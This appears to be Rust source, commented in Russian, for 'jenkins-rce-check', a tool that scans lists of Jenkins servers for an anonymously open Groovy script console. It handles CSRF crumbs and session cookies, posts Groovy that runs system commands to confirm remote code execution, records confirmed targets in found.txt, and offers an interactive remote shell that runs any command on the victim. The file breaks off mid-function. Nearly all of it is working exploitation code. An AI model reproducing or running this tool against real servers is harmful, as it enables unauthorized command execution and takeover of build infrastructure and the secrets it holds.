use std::collections::{BTreeMap, HashSet};
use std::env;
use std::fs::{self, File, OpenOptions};
use std::io::{self, Write};
use std::path::{Path, PathBuf};
use std::process::ExitCode;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

use base64::engine::general_purpose::STANDARD as B64;
use base64::Engine;
use futures::stream::{self, StreamExt};
use reqwest::header::{HeaderMap, HeaderValue, CONNECTION, CONTENT_TYPE, COOKIE, SET_COOKIE};
use reqwest::{Client, RequestBuilder};
use serde::Serialize;
use tokio::sync::Mutex;
use tokio::time::Instant;

const UA: &str = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36";

// (имя для -c, выражение Groovy). Expr должен быть выражением, результат которого — вывод команды.
const GROOVY: [(&str, &str); 6] = [
    ("id", r#"["id"].execute().text"#),
    ("whoami", r#"["whoami"].execute().text"#),
    ("hostname", r#"["hostname"].execute().text"#),
    ("pwd", r#"["pwd"].execute().text"#),
    ("uname", r#"["uname","-a"].execute().text"#),
    ("date", r#"["date"].execute().text"#),
];

const ENDPOINTS: [(&str, &str); 8] = [
    ("script", "/script"),
    ("scriptText", "/scriptText"),
    ("crumbIssuer", "/crumbIssuer/api/json"),
    ("api", "/api/json"),
    ("manage", "/manage"),
    ("configure", "/configure"),
    ("pluginManager", "/pluginManager/installed"),
    ("systemInfo", "/systemInfo"),
];

// Маркер в proof. Позволяет перепроверить цель другой командой с тем же nonce:
//   jenkins-rce-check.exe <target> -c whoami --nonce <nonce>
const PROOF_MARKER: &str = "RCEPROOF";
const SHELL_MARKER: &str = "RCE_SHELL";
const SHELL_TIMEOUT_SECS: u64 = 30;

// Любое из этих подстрок в ответе означает ошибку/защиту, а не вывод команды.
const ERROR_MARKERS: [&str; 5] = [
    "error 403",
    "no valid crumb",
    "forbidden",
    "exception",
    "access denied",
];

const DEFAULT_COMMAND: &str = "id";
const DEFAULT_PARALLEL: usize = 8;
const TIMEOUT_SECS: u64 = 5;
const CONNECT_TIMEOUT_MS: u64 = 1500;
const POST_ATTEMPTS: usize = 3;

static FORCE_NO_COLOR: AtomicBool = AtomicBool::new(false);

fn no_color() -> bool {
    if FORCE_NO_COLOR.load(Ordering::Relaxed) {
        return true;
    }
    if env::var_os("NO_COLOR").is_some() {
        return true;
    }
    if matches!(env::var("CLICOLOR").as_deref(), Ok("0")) {
        return true;
    }
    if matches!(env::var("TERM").as_deref(), Ok("dumb")) {
        return true;
    }
    false
}

fn paint(text: &str, code: &str) -> String {
    if no_color() {
        return text.to_string();
    }
    format!("\x1b[{code}m{text}\x1b[0m")
}

fn vcolor(verdict: &str) -> &'static str {
    match verdict {
        "rce_confirmed" => "91",
        "csrf_blocked" | "script_console_anonymous_proof_failed" | "script_console_anonymous_unverified" => "93",
        "no_anonymous_script_console" => "92",
        "not_jenkins" => "90",
        _ => "97",
    }
}

fn link(url: &str) -> String {
    if no_color() {
        return url.to_string();
    }
    format!("\x1b]8;;{url}\x1b\\{}\x1b]8;;\x1b\\", paint(url, "91"))
}

#[derive(Serialize, Clone)]
#[serde(rename_all = "camelCase")]
struct Endpoints {
    root: u16,
    script: u16,
    script_text: u16,
    crumb_issuer: u16,
    api: u16,
    manage: u16,
    configure: u16,
    plugin_manager: u16,
    system_info: u16,
}

#[derive(Serialize, Clone)]
struct ScanResult {
    url: String,
    version: String,
    is_jenkins: bool,
    verdict: String,
    anonymous_script_console: bool,
    proof_endpoint: Option<String>,
    proof: Option<String>,
    command: String,
    nonce: String,
    endpoints: Endpoints,
}

struct Resp {
    status: u16,
    headers: HeaderMap,
    body: String,
}

#[derive(Clone)]
struct Config {
    command: String,
    nonce: String,
    groovy: String,
    parallel: usize,
    rate_limit: Option<usize>,
    output: Option<PathBuf>,
    output_dir: PathBuf,
}

enum Input {
    Single(String),
    Batch(Vec<String>),
    Shell(String),
}

struct Chosen {
    input: Input,
    config: Config,
    keep_console: bool,
}

fn default_config() -> Config {
    Config {
        command: DEFAULT_COMMAND.to_string(),
        nonce: gen_nonce(),
        groovy: String::new(),
        parallel: DEFAULT_PARALLEL,
        rate_limit: None,
        output: None,
        output_dir: env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
    }
}

fn sanitize_nonce(s: &str) -> String {
    s.chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))
        .take(64)
        .collect()
}

fn gen_nonce() -> String {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let pid = std::process::id() as u128;
    format!("{:x}{:x}", nanos, pid)
}

fn groovy_for(name: &str, nonce: &str) -> Option<String> {
    let expr = GROOVY.iter().find(|(n, _)| *n == name).map(|(_, e)| *e)?;
    Some(format!(
        "return \"{PROOF_MARKER}_{nonce}:\" + ({expr})"
    ))
}

fn command_known(name: &str) -> bool {
    name == "verify" || GROOVY.iter().any(|(n, _)| *n == name)
}

fn configure_groovy(config: &mut Config) {
    config.groovy = if config.command == "verify" {
        groovy_verify(&config.nonce)
    } else {
        groovy_for(&config.command, &config.nonce).unwrap()
    };
}

// Детерминированный proof: токен генерируется локально, а цель должна вернуть
// его же, выполнив echo. Страница 403 или кэш такой токенподделать не могут.
fn groovy_verify(nonce: &str) -> String {
    let token = format!("{PROOF_MARKER}_{nonce}:{nonce}");
    format!(
        "def os = System.getProperty('os.name').toLowerCase(); \
         def p = os.contains('windows') ? ['cmd','/c','echo {token}'].execute() \
                                        : ['/bin/sh','-c','echo {token}'].execute(); \
         return new String(p.getInputStream().bytes, 'UTF-8')"
    )
}

fn validate_verify(out: &Resp, nonce: &str, from_pre: bool) -> Option<String> {
    if !(200..300).contains(&out.status) {
        return None;
    }
    let text = if from_pre {
        let pres: Vec<String> = extract_pre_blocks(&out.body)
            .iter()
            .map(|p| clean_text(p).trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        pres.last().cloned()?
    } else {
        clean_text(&out.body)
    };
    let token = format!("{PROOF_MARKER}_{nonce}:{nonce}");
    if text.contains(&token) {
        Some(token)
    } else {
        None
    }
}

fn usage() -> &'static str {
    "jenkins-rce-check\n\
     \n\
     Использование:\n\
       jenkins-rce-check [ЦЕЛЬ] [опции]\n\
        jenkins-rce-check -l targets.txt [опции]\n\
        jenkins-rce-check --shell <url>  интерактивный шелл\n\
        jenkins-rce-check              открыть меню (п.3 — выбор из found.txt)\n\
     \n\
     Опции:\n\
        -s, --shell <url>       интерактивный шелл на подтверждённой цели\n\
        -l, --list <file>       список целей (по одной на строку, '#' — комментарий)\n\
       -o, --output <file>     записать все результаты в JSONL (удобно для jq)\n\
        -c, --command <name>    proof: verify (точный токен), id, whoami, hostname, pwd, uname, date\n\
       --nonce <str>           свой маркер proof (иначе генерируется; нужен для перепроверки другой командой)\n\
       --output-dir <dir>      куда писать found.txt (по умолчанию — текущая папка)\n\
       -p, --parallel <n>      параллельные цели (по умолчанию 8)\n\
       -rl, --rate-limit <n>   общий лимит HTTP-запросов в секунду (по умолчанию без лимита)\n\
       --no-color              не выводить ANSI-коды и OSC-гиперссылки\n\
       -h, --help              эта справка\n\
     \n\
     Переменные окружения: NO_COLOR, CLICOLOR=0, TERM=dumb — отключают цвет.\n\
     \n\
     Вердикты: rce_confirmed, csrf_blocked, script_console_anonymous_proof_failed,\n\
               no_anonymous_script_console, not_jenkins"
}

fn pause_console() {
    println!();
    print!("Нажмите Enter для выхода...");
    let _ = io::stdout().flush();
    let mut line = String::new();
    let _ = io::stdin().read_line(&mut line);
}

fn decode_utf16(bytes: &[u8], le: bool) -> String {
    let units: Vec<u16> = bytes
        .chunks_exact(2)
        .map(|c| {
            if le {
                u16::from_le_bytes([c[0], c[1]])
            } else {
                u16::from_be_bytes([c[0], c[1]])
            }
        })
        .collect();
    String::from_utf16_lossy(&units)
}

fn cp1251_char(b: u8) -> char {
    match b {
        0x00..=0x7F => b as char,
        0xA8 => '\u{0408}',
        0xB8 => '\u{0409}',
        0xC0..=0xFF => char::from_u32(0x0410 + (b - 0xC0) as u32).unwrap_or('\u{FFFD}'),
        0x80..=0xBF => char::from_u32(b as u32).unwrap_or('\u{FFFD}'),
    }
}

fn decode_targets(bytes: &[u8]) -> String {
    if bytes.starts_with(&[0xEF, 0xBB, 0xBF]) {
        return String::from_utf8_lossy(&bytes[3..]).into_owned();
    }
    if bytes.starts_with(&[0xFF, 0xFE]) {
        return decode_utf16(&bytes[2..], true);
    }
    if bytes.starts_with(&[0xFE, 0xFF]) {
        return decode_utf16(&bytes[2..], false);
    }
    let sample = &bytes[..bytes.len().min(64)];
    if sample.len() >= 4 {
        let even_nul = sample.iter().step_by(2).filter(|&&b| b == 0).count();
        let odd_nul = sample.iter().skip(1).step_by(2).filter(|&&b| b == 0).count();
        let threshold = sample.len() / 8;
        if odd_nul > threshold {
            return decode_utf16(bytes, true);
        }
        if even_nul > threshold {
            return decode_utf16(bytes, false);
        }
    }
    if let Ok(s) = std::str::from_utf8(bytes) {
        return s.to_string();
    }
    bytes.iter().map(|&b| cp1251_char(b)).collect()
}

fn read_targets(path: &Path) -> Result<Vec<String>, String> {
    let raw = fs::read(path)
        .map_err(|e| format!("не могу прочитать {}: {e}", path.display()))?;
    let content = decode_targets(&raw);
    let targets: Vec<String> = content
        .lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .map(str::to_string)
        .collect();
    if targets.is_empty() {
        return Err(format!("{} пуст", path.display()));
    }
    Ok(targets)
}

fn find_default_targets() -> Result<Vec<String>, String> {
    let cwd = PathBuf::from("targets.txt");
    if cwd.exists() {
        return read_targets(&cwd);
    }
    if let Ok(mut exe_dir) = env::current_exe() {
        exe_dir.pop();
        exe_dir.push("targets.txt");
        if exe_dir.exists() {
            return read_targets(&exe_dir);
        }
    }
    Err("targets.txt не найден (ни в текущей папке, ни рядом с exe)".to_string())
}

fn find_found() -> Result<Vec<String>, String> {
    let mut candidates = vec![PathBuf::from("found.txt")];
    if let Ok(mut exe_dir) = env::current_exe() {
        exe_dir.pop();
        exe_dir.push("found.txt");
        candidates.push(exe_dir);
    }
    for path in candidates {
        if path.exists() {
            return read_targets(&path);
        }
    }
    Err("found.txt не найден (ни в текущей папке, ни рядом с exe)".to_string())
}

fn choose_target_from_found() -> Result<String, i32> {
    let targets = match find_found() {
        Ok(v) => v,
        Err(e) => {
            println!("[!] {e}");
            return Err(2);
        }
    };
    println!("\nПодтверждённые цели из found.txt:");
    for (i, t) in targets.iter().enumerate() {
        println!("  {}) {t}", i + 1);
    }
    let answer = match prompt("Выберите номер или URL (0 — отмена): ") {
        Some(s) => s,
        None => return Err(0),
    };
    if answer.is_empty() || answer == "0" {
        return Err(0);
    }
    if let Ok(n) = answer.parse::<usize>() {
        if n >= 1 && n <= targets.len() {
            return Ok(targets[n - 1].clone());
        }
    }
    if let Some(t) = targets.iter().find(|t| **t == answer) {
        return Ok(t.clone());
    }
    println!("[!] неверный выбор");
    Err(2)
}

fn prompt(message: &str) -> Option<String> {
    print!("{message}");
    let _ = io::stdout().flush();
    let mut line = String::new();
    match io::stdin().read_line(&mut line) {
        Ok(0) => None,
        Ok(_) => Some(line.trim().to_string()),
        Err(_) => None,
    }
}

fn interactive() -> Result<Chosen, i32> {
    println!("=== jenkins-rce-check ===");
    loop {
        println!();
        println!("  1) Проверить одну цель");
        println!("  2) Проверить список из targets.txt");
        println!("  3) Интерактивный шелл (из found.txt)");
        println!("  4) Справка");
        println!("  0) Выход");
        let choice = match prompt("Выберите [0-4]: ") {
            Some(c) => c,
            None => {
                pause_console();
                return Err(0);
            }
        };
        match choice.as_str() {
            "1" => {
                let target = match prompt("Цель (url или host[:port]): ") {
                    Some(t) if !t.is_empty() => t,
                    Some(_) => {
                        println!("[!] пустая цель");
                        continue;
                    }
                    None => {
                        pause_console();
                        return Err(0);
                    }
                };
                let mut config = default_config();
                configure_groovy(&mut config);
                return Ok(Chosen { input: Input::Single(target), config, keep_console: true });
            }
            "2" => match find_default_targets() {
                Ok(v) => {
                    let mut config = default_config();
                    configure_groovy(&mut config);
                    return Ok(Chosen { input: Input::Batch(v), config, keep_console: true });
                }
                Err(e) => println!("[!] {e}"),
            },
            "3" => match choose_target_from_found() {
                Ok(url) => {
                    let mut config = default_config();
                    configure_groovy(&mut config);
                    return Ok(Chosen { input: Input::Shell(url), config, keep_console: true });
                }
                Err(0) => continue,
                Err(code) => return Err(code),
            },
            "4" => println!("{}", usage()),
            "0" | "" => {
                pause_console();
                return Err(0);
            }
            _ => println!("[!] неверный выбор"),
        }
    }
}

fn next_value(args: &[String], i: &mut usize, flag: &str) -> Result<String, i32> {
    *i += 1;
    if *i >= args.len() {
        eprintln!("[!] {flag}: не указано значение");
        return Err(2);
    }
    Ok(args[*i].clone())
}

fn parse_usize(s: &str, flag: &str, min: usize) -> Result<usize, i32> {
    match s.parse::<usize>() {
        Ok(v) if v >= min => Ok(v),
        _ => {
            eprintln!("[!] {flag}: ожидается целое число >= {min}, получено '{s}'");
            Err(2)
        }
    }
}

fn parse_input() -> Result<Chosen, i32> {
    let args: Vec<String> = env::args().skip(1).collect();

    if args.is_empty() {
        return interactive();
    }

    let mut single: Option<String> = None;
    let mut list_file: Option<PathBuf> = None;
    let mut shell = false;
    let mut config = default_config();

    let mut i = 0;
    while i < args.len() {
        let arg = args[i].as_str();
        match arg {
            "-h" | "--help" | "help" => {
                println!("{}", usage());
                return Err(0);
            }
            "--no-color" => FORCE_NO_COLOR.store(true, Ordering::Relaxed),
            "-s" | "--shell" => {
                single = Some(next_value(&args, &mut i, arg)?);
                shell = true;
            }
            "-l" | "--list" => {
                list_file = Some(PathBuf::from(next_value(&args, &mut i, arg)?));
            }
            "-o" | "--output" => {
                config.output = Some(PathBuf::from(next_value(&args, &mut i, arg)?));
            }
            "-c" | "--command" => {
                let v = next_value(&args, &mut i, arg)?;
                if !command_known(&v) {
                    eprintln!("[!] неизвестная команда '{v}'. Доступны: {}",
                        GROOVY.iter().map(|(n, _)| *n).collect::<Vec<_>>().join(", "));
                    return Err(2);
                }
                config.command = v;
            }
            "--nonce" => {
                config.nonce = sanitize_nonce(&next_value(&args, &mut i, arg)?);
                if config.nonce.is_empty() {
                    eprintln!("[!] --nonce: пустое или недопустимое значение");
                    return Err(2);
                }
            }
            "--output-dir" => {
                config.output_dir = PathBuf::from(next_value(&args, &mut i, arg)?);
            }
            "-p" | "--parallel" => {
                let v = next_value(&args, &mut i, arg)?;
                config.parallel = parse_usize(&v, arg, 1)?;
            }
            "-rl" | "--rate-limit" | "--rate" => {
                let v = next_value(&args, &mut i, arg)?;
                config.rate_limit = Some(parse_usize(&v, arg, 1)?);
            }
            a if a.starts_with('-') => {
                eprintln!("[!] неизвестная опция: {a}");
                eprintln!("{}", usage());
                return Err(2);
            }
            a => {
                if single.is_some() {
                    eprintln!("[!] указано несколько целей: '{a}'. Используйте -l для списка.");
                    return Err(2);
                }
                single = Some(a.to_string());
            }
        }
        i += 1;
    }

    if shell {
        if list_file.is_some() {
            eprintln!("[!] --shell и -l несовместимы");
            return Err(2);
        }
        let t = single.take().expect("--shell без цели");
        return Ok(Chosen { input: Input::Shell(t), config, keep_console: false });
    }

    let input = match (single, list_file) {
        (Some(_), Some(_)) => {
            eprintln!("[!] укажите либо цель, либо -l, не оба сразу");
            return Err(2);
        }
        (Some(t), None) => Input::Single(t),
        (None, Some(p)) => Input::Batch(read_targets(&p).map_err(|e| {
            eprintln!("[!] {e}");
            2
        })?),
        (None, None) => {
            eprintln!("[!] не указана цель. Используйте -l <file> или запустите без аргументов для меню.");
            eprintln!("{}", usage());
            return Err(2);
        }
    };

    configure_groovy(&mut config);
    Ok(Chosen { input, config, keep_console: false })
}

fn normalize(target: &str) -> String {
    let t = target.trim();
    let lower = t.to_ascii_lowercase();
    let base = if lower.starts_with("http://") || lower.starts_with("https://") {
        t.to_string()
    } else {
        format!("http://{t}")
    };
    base.trim_end_matches('/').to_string()
}

// Глобальный ограничитель скорости: не больше rate запросов в секунду на все цели.
struct RateLimiter {
    inner: Mutex<LimiterState>,
}

struct LimiterState {
    next: Instant,
    interval: Duration,
}

impl RateLimiter {
    fn new(rate: Option<usize>) -> Self {
        let interval = match rate {
            Some(n) if n > 0 => Duration::from_secs_f64(1.0 / n as f64),
            _ => Duration::ZERO,
        };
        Self {
            inner: Mutex::new(LimiterState {
                next: Instant::now(),
                interval,
            }),
        }
    }

    async fn wait(&self) {
        let mut st = self.inner.lock().await;
        if st.interval.is_zero() {
            return;
        }
        let now = Instant::now();
        if st.next < now {
            st.next = now;
        }
        let until = st.next;
        let interval = st.interval;
        st.next += interval;
        drop(st);
        tokio::time::sleep_until(until).await;
    }
}

async fn send(builder: RequestBuilder, rl: &RateLimiter) -> Resp {
    rl.wait().await;
    match builder.send().await {
        Ok(r) => {
            let status = r.status().as_u16();
            let headers = r.headers().clone();
            let body = r.text().await.unwrap_or_default();
            Resp { status, headers, body }
        }
        Err(e) => Resp { status: 0, headers: HeaderMap::new(), body: e.to_string() },
    }
}

async fn get(client: &Client, url: &str, rl: &RateLimiter) -> Resp {
    send(client.get(url), rl).await
}

// Для эндпоинтов, где нужен только статус: не читаем тело вообще.
async fn get_light(client: &Client, url: &str, rl: &RateLimiter) -> Resp {
    rl.wait().await;
    match client.get(url).send().await {
        Ok(r) => Resp {
            status: r.status().as_u16(),
            headers: HeaderMap::new(),
            body: String::new(),
        },
        Err(e) => Resp {
            status: 0,
            headers: HeaderMap::new(),
            body: e.to_string(),
        },
    }
}

fn cookies_from(headers: &HeaderMap) -> String {
    let mut parts = Vec::new();
    for value in headers.get_all(SET_COOKIE) {
        if let Ok(s) = value.to_str() {
            let pair = s.split(';').next().unwrap_or("").trim();
            if !pair.is_empty() {
                parts.push(pair.to_string());
            }
        }
    }
    parts.join("; ")
}

// Атрибуты Set-Cookie — это не сами cookie, их не шлём обратно в Cookie header.
fn is_cookie_attribute(name: &str) -> bool {
    matches!(
        name.to_ascii_lowercase().as_str(),
        "path" | "domain" | "expires" | "max-age" | "secure" | "httponly" | "samesite" | "priority"
    )
}

// Добавить/заменить cookies, сохраняя одну и ту же сессию между запросами.
fn merge_cookie(cookie: &mut String, set_cookie: String) {
    if set_cookie.is_empty() {
        return;
    }
    for pair in set_cookie.split(';').map(str::trim).filter(|p| !p.is_empty()) {
        let name = pair.split('=').next().unwrap_or("");
        if is_cookie_attribute(name) {
            continue;
        }
        let mut kept: Vec<String> = cookie
            .split(';')
            .map(str::trim)
            .filter(|p| !p.is_empty())
            .filter(|p| p.split('=').next().unwrap_or("") != name)
            .map(str::to_string)
            .collect();
        kept.push(pair.to_string());
        *cookie = kept.join("; ");
    }
}

fn parse_crumb(body: &str) -> String {
    serde_json::from_str::<serde_json::Value>(body)
        .ok()
        .and_then(|v| v.get("crumb").and_then(|c| c.as_str()).map(str::to_string))
        .unwrap_or_default()
}

// Crumb привязан к сессии: запрашиваем его с тем же cookie, что и последующий POST,
// и подхватываем новый Set-Cookie (keep-alive + та же сессия).
async fn fetch_crumb(client: &Client, url: &str, cookie: &str, rl: &RateLimiter) -> (String, String) {
    let mut req = client.get(url).header(CONNECTION, "keep-alive");
    if !cookie.is_empty() {
        if let Ok(v) = HeaderValue::from_str(cookie) {
            req = req.header(COOKIE, v);
        }
    }
    let out = send(req, rl).await;
    (parse_crumb(&out.body), cookies_from(&out.headers))
}

// POST с тем же crumb и cookie, на том же connection (keep-alive).
async fn post_script(
    client: &Client,
    url: &str,
    crumb: &str,
    cookie: &str,
    groovy: &str,
    rl: &RateLimiter,
) -> Resp {
    let mut headers = HeaderMap::new();
    if !crumb.is_empty() {
        if let Ok(v) = HeaderValue::from_str(crumb) {
            headers.insert("Jenkins-Crumb", v);
        }
    }
    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/x-www-form-urlencoded"));
    headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
    if !cookie.is_empty() {
        if let Ok(v) = HeaderValue::from_str(cookie) {
            headers.insert(COOKIE, v);
        }
    }
    let form = [("script", groovy), ("Submit", "Run")];
    send(client.post(url).headers(headers).form(&form), rl).await
}

// Команда и вывод идут base64, чтобы кавычки, $ и переводы строк не ломали Groovy.
fn shell_groovy(cmd_b64: &str, nonce: &str) -> String {
    format!(
        "def c = new String('{cmd_b64}'.decodeBase64(), 'UTF-8'); \
         def os = System.getProperty('os.name').toLowerCase(); \
         def p = os.contains('windows') ? ['cmd','/c',c].execute() : ['/bin/sh','-c',c].execute(); \
         def o = new String(p.getInputStream().bytes, 'UTF-8') + new String(p.getErrorStream().bytes, 'UTF-8'); \
         return '{SHELL_MARKER}_{nonce}:' + o.bytes.encodeBase64().toString()"
    )
}

fn shell_output(body: &str, nonce: &str) -> Option<String> {
    let pres: Vec<String> = extract_pre_blocks(body)
        .iter()
        .map(|p| clean_text(p).trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();
    let text = pres.last().cloned().unwrap_or_else(|| clean_text(body));
    let marker = format!("{SHELL_MARKER}_{nonce}:");
    let idx = text.find(&marker)?;
    let raw = text[idx + marker.len()..].trim();
    B64.decode(raw).ok().map(|b| String::from_utf8_lossy(&b).into_owned())
}

async fn shell_session(client: Client, target: String, nonce: String, rl: Arc<RateLimiter>) {
    let base = normalize(&target);
    let u_script = format!("{base}/script");
    let u_crumb = format!("{base}/crumbIssuer/api/json");
    println!("Шелл: {base}  (/exit — выход, /help — справка)");

    let first = get(&client, &u_crumb, &rl).await;
    let mut cookie = cookies_from(&first.headers);
    let mut crumb = parse_crumb(&first.body);

    loop {
        let line = match prompt("shell> ") {
            Some(s) => s,
            None => break,
        };
        let cmd = line.trim();
        if cmd.eq_ignore_ascii_case("/exit") || cmd.eq_ignore_ascii_case("exit") {
            break;
        }
        if cmd.eq_ignore_ascii_case("/help") {
            println!("  /exit   — выйти");
            println!("  /help   — эта справка");
            println!("  любая другая строка выполняется как команда оболочки на цели");
            continue;
        }
        if cmd.is_empty() {
            continue;
        }

        let b64 = B64.encode(cmd.as_bytes());
        let groovy = shell_groovy(&b64, &nonce);
        let mut out = post_script(&client, &u_script, &crumb, &cookie, &groovy, &rl).await;

        if shell_output(&out.body, &nonce).is_none() {
            let low = out.body.to_ascii_lowercase();
            if out.status == 403 || low.contains("no valid crumb") || low.contains("forbidden") {
                let (c, nc) = fetch_crumb(&client, &u_crumb, &cookie, &rl).await;
                crumb = c;
                merge_cookie(&mut cookie, nc);
                out = post_script(&client, &u_script, &crumb, &cookie, &groovy, &rl).await;
            }
        }

        match shell_output(&out.body, &nonce) {
            Some(text) => print!("{text}"),
            None => {
                let snippet: String = clean_text(&out.body).chars().take(300).collect();
                println!("[!] нет вывода (HTTP {}): {}", out.status, snippet);
            }
        }
        let _ = io::stdout().flush();
    }
    println!("Шелл закрыт.");
}

fn strip_tags(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut in_tag = false;
    for c in s.chars() {
        match c {
            '<' => in_tag = true,
            '>' => in_tag = false,
            _ if !in_tag => out.push(c),
            _ => {}
        }
    }
    out
}

fn html_unescape(s: &str) -> String {
    if !s.contains('&') {
        return s.to_string();
    }
    let chars: Vec<char> = s.chars().collect();
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '&' {
            if let Some(rel) = chars[i + 1..].iter().position(|&c| c == ';') {
                let end = i + 1 + rel;
                let ent: String = chars[i + 1..end].iter().collect();
                let replacement = match ent.as_str() {
                    "amp" => Some('&'),
                    "lt" => Some('<'),
                    "gt" => Some('>'),
                    "quot" => Some('"'),
                    "apos" => Some('\''),
                    "nbsp" => Some('\u{a0}'),
                    _ => {
                        if let Some(hex) = ent.strip_prefix("#x").or_else(|| ent.strip_prefix("#X")) {
                            u32::from_str_radix(hex, 16).ok().and_then(char::from_u32)
                        } else if let Some(dec) = ent.strip_prefix('#') {
                            dec.parse::<u32>().ok().and_then(char::from_u32)
                        } else {
                            None
                        }
                    }
                };
                if let Some(c) = replacement {
                    out.push(c);
                    i = end + 1;
                    continue;
                }
            }
        }
        out.push(chars[i]);
        i += 1;
    }
    out
}

fn clean_text(s: &str) -> String {
    html_unescape(&strip_tags(s))
}

fn extract_pre_blocks(text: &str) -> Vec<String> {
    let lower = text.to_ascii_lowercase();
    let mut out = Vec::new();
    let mut pos = 0;
    while let Some(rel) = lower[pos..].find("<pre") {
        let start = pos + rel;
        let Some(gt_rel) = lower[start..].find('>') else { break };
        let content_start = start + gt_rel + 1;
        let Some(close_rel) = lower[content_start..].find("</pre") else { break };
        let content_end = content_start + close_rel;
        out.push(text[content_start..content_end].to_string());
        pos = content_end + "</pre".len();
    }
    out
}

// Proof считаем валидным только если:
//  1) статус 2xx,
//  2) в ответе нет маркеров ошибок/защиты,
//  3) есть наш nonce-маркер (и, для id, 'uid='),
//  4) вывод взят из <pre> (для /script; для /scriptText — из text/plain).
fn validate_proof(out: &Resp, cmd: &str, nonce: &str, from_pre: bool) -> Option<String> {
    if !(200..300).contains(&out.status) {
        return None;
    }
    let lower = out.body.to_ascii_lowercase();
    if ERROR_MARKERS.iter().any(|m| lower.contains(m)) {
        return None;
    }

    let content = if from_pre {
        let pres = extract_pre_blocks(&out.body);
        if pres.is_empty() {
            return None;
        }
        pres.iter()
            .map(|p| clean_text(p).trim().to_string())
            .filter(|s| !s.is_empty())
            .last()
            .unwrap_or_default()
    } else {
        clean_text(&out.body).trim().to_string()
    };

    let marker = format!("{PROOF_MARKER}_{nonce}:");
    let idx = content.find(&marker)?;
    let proof = content[idx + marker.len()..].trim().to_string();
    if proof.is_empty() {
        return None;
    }
    // Дополнительная проверка «под команду» — страховка от подмены маркера.
    if cmd == "id" && !proof.contains("uid=") {
        return None;
    }
    Some(proof.chars().take(2000).collect())
}

fn jenkins_version_in_body(body: &str) -> Option<String> {
    let lower = body.to_ascii_lowercase();
    if let Some(p) = lower.find("dashboard") {
        let rest = lower[p + "dashboard".len()..].trim_start();
        if let Some(rest) = rest.strip_prefix('-') {
            if rest.trim_start().starts_with("jenkins") {
                return Some("Dashboard - Jenkins".to_string());
            }
        }
    }

    let bytes = lower.as_bytes();
    let mut search = 0;
    while let Some(rel) = lower[search..].find("jenkins") {
        let p = search + rel;
        let mut k = p + "jenkins".len();
        while k < bytes.len() && bytes[k].is_ascii_whitespace() {
            k += 1;
        }
        if k + 2 < bytes.len()
            && bytes[k].is_ascii_digit()
            && bytes[k + 1] == b'.'
            && bytes[k + 2].is_ascii_digit()
        {
            let mut e = k + 3;
            while e < bytes.len() && (bytes[e].is_ascii_digit() || bytes[e] == b'.') {
                e += 1;
            }
            return Some(body[p..e].to_string());
        }
        search = p + "jenkins".len();
    }
    None
}

fn log_line(logs: &mut String, prefix: &str, msg: &str) {
    logs.push_str(prefix);
    logs.push_str(msg);
    logs.push('\n');
}

async fn check_target(
    client: Client,
    target: String,
    config: Arc<Config>,
    rl: Arc<RateLimiter>,
    prefix: String,
) -> (ScanResult, String) {
    let started = std::time::Instant::now();
    let base = normalize(&target);
    let mut logs = String::with_capacity(512);
    log_line(&mut logs, &prefix, &base);

    let u_root = format!("{base}/");
    let u_script = format!("{base}/script");
    let u_script_text = format!("{base}/scriptText");
    let u_api = format!("{base}/api/json");
    let u_manage = format!("{base}/manage");
    let u_configure = format!("{base}/configure");
    let u_plugins = format!("{base}/pluginManager/installed");
    let u_system = format!("{base}/systemInfo");
    let u_crumb = format!("{base}/crumbIssuer/api/json");
    let (root, r_script, r_script_text, r_api, r_manage, r_configure, r_plugin, r_system, crumb_resp) =
        futures::join!(
            get(&client, &u_root, &rl),
            get(&client, &u_script, &rl),
            get(&client, &u_script_text, &rl),
            get_light(&client, &u_api, &rl),
            get_light(&client, &u_manage, &rl),
            get_light(&client, &u_configure, &rl),
            get_light(&client, &u_plugins, &rl),
            get_light(&client, &u_system, &rl),
            get(&client, &u_crumb, &rl),
        );

    log_line(&mut logs, &prefix, &format!("  GET / -> {}", root.status));
    let codes = [
        r_script.status,
        r_script_text.status,
        crumb_resp.status,
        r_api.status,
        r_manage.status,
        r_configure.status,
        r_plugin.status,
        r_system.status,
    ];
    for (i, (_, path)) in ENDPOINTS.iter().enumerate() {
        log_line(&mut logs, &prefix, &format!("  GET {path} -> {}", codes[i]));
    }

    let mut version = root
        .headers
        .get("x-jenkins")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_string();
    if version.is_empty() {
        version = jenkins_version_in_body(&root.body).unwrap_or_default();
    }
    let lower_body = root.body.to_ascii_lowercase();
    let is_jenkins = !version.is_empty()
        || root.headers.contains_key("x-hudson")
        || lower_body.contains("dashboard - jenkins");
    log_line(
        &mut logs,
        &prefix,
        &format!("  Jenkins={is_jenkins} version={}", if version.is_empty() { "-" } else { &version }),
    );

    let script_lower = r_script.body.to_ascii_lowercase();
    let mut script_anon =
        script_lower.contains("name=\"script\"") || script_lower.contains("name='script'");
    if !script_anon && codes[1] == 200 && r_script_text.body.to_ascii_lowercase().contains("script") {
        script_anon = true;
    }
    log_line(&mut logs, &prefix, &format!("  anonymous_script_console={script_anon}"));

    // /script отдаёт вывод в <pre>; /scriptText — text/plain.
    let ep = if r_script.status == 200 && script_anon { "/script" } else { "/scriptText" };
    let from_pre = ep == "/script";
    let url_post = format!("{base}{ep}");

    let mut proof: Option<String> = None;
    let mut proof_endpoint: Option<String> = None;
    let mut cookie = cookies_from(&crumb_resp.headers);
    let mut crumb = parse_crumb(&crumb_resp.body);
    let mut csrf_blocked = false;
    let mut post_status = 0u16;

    if script_anon {
        if config.command == "verify" {
            // Точный proof: собственный токен должен вернуться из выполненной команды.
            let combos = [
                ("/script", true, crumb.as_str()),
                ("/script", true, ""),
